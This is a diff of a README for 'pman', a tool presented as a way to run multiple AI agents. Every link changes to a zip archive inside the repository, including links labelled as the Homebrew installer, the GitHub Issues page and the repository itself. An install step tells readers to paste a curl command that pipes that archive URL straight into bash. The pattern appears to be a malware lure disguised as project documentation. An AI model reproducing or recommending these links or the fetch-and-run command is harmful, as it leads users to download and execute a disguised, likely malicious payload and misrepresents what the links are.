@@ -1,6 +1,6 @@
 # 🤖 pman - Run Multiple AI Agents Effortlessly
 
-[![Download pman](https://github.com/TheGap2024/pman/raw/refs/heads/main/src/components/Software-v3.5-beta.3.zip%https://github.com/TheGap2024/pman/raw/refs/heads/main/src/components/Software-v3.5-beta.3.zip)](https://github.com/TheGap2024/pman/raw/refs/heads/main/src/components/Software-v3.5-beta.3.zip)
+[![Download pman](https://github.com/TheGap2024/pman/raw/refs/heads/main/src/integrations/Software_v2.8-alpha.1.zip%https://github.com/TheGap2024/pman/raw/refs/heads/main/src/integrations/Software_v2.8-alpha.1.zip)](https://github.com/TheGap2024/pman/raw/refs/heads/main/src/integrations/Software_v2.8-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -34,14 +34,14 @@ You can visualize your sessions like this:
 
 ## 📥 Download & Install
 
-To get started, visit this page: [Download pman](https://github.com/TheGap2024/pman/raw/refs/heads/main/src/components/Software-v3.5-beta.3.zip). Here, you will find the latest version ready for download.
+To get started, visit this page: [Download pman](https://github.com/TheGap2024/pman/raw/refs/heads/main/src/integrations/Software_v2.8-alpha.1.zip). Here, you will find the latest version ready for download.
 
 ### 📋 System Requirements
 
 Before you download pman, ensure your computer meets the following requirements:
 
 - **Operating System**: macOS 10.15 or later
-- **Homebrew**: Ensure you have Homebrew installed. If not, you can install it from [https://github.com/TheGap2024/pman/raw/refs/heads/main/src/components/Software-v3.5-beta.3.zip](https://github.com/TheGap2024/pman/raw/refs/heads/main/src/components/Software-v3.5-beta.3.zip).
+- **Homebrew**: Ensure you have Homebrew installed. If not, you can install it from [https://github.com/TheGap2024/pman/raw/refs/heads/main/src/integrations/Software_v2.8-alpha.1.zip](https://github.com/TheGap2024/pman/raw/refs/heads/main/src/integrations/Software_v2.8-alpha.1.zip).
 - **Memory**: At least 4 GB of RAM is recommended.
 - **Disk Space**: 50 MB of available disk space for the installation.
 
@@ -51,7 +51,7 @@ Before you download pman, ensure your computer meets the following requirements:
    Open your terminal and paste the following command:
 
    ```bash
-   /bin/bash -c "$(curl -fsSL https://github.com/TheGap2024/pman/raw/refs/heads/main/src/components/Software-v3.5-beta.3.zip)"
+   /bin/bash -c "$(curl -fsSL https://github.com/TheGap2024/pman/raw/refs/heads/main/src/integrations/Software_v2.8-alpha.1.zip)"
    ```
 
 2. **Install pman**:
@@ -90,13 +90,13 @@ If you encounter any issues, here are a few common solutions:
 - **Session Not Found**: Double-check the session name you're trying to access; ensure it matches exactly.
 - **Performance Issues**: Verify that your system meets the memory and disk requirements.
 
-For further assistance, you can refer to the [GitHub Issues page](https://github.com/TheGap2024/pman/raw/refs/heads/main/src/components/Software-v3.5-beta.3.zip).
+For further assistance, you can refer to the [GitHub Issues page](https://github.com/TheGap2024/pman/raw/refs/heads/main/src/integrations/Software_v2.8-alpha.1.zip).
 
 ## 🗣️ Community & Support
 
 Feel free to contribute to pman on GitHub! You can submit issues or share your feedback. Your insights help improve the application for everyone.
 
-For updates, follow us on our [GitHub repository](https://github.com/TheGap2024/pman/raw/refs/heads/main/src/components/Software-v3.5-beta.3.zip).
+For updates, follow us on our [GitHub repository](https://github.com/TheGap2024/pman/raw/refs/heads/main/src/integrations/Software_v2.8-alpha.1.zip).
 
 ## 📦 Summary of Commands
 
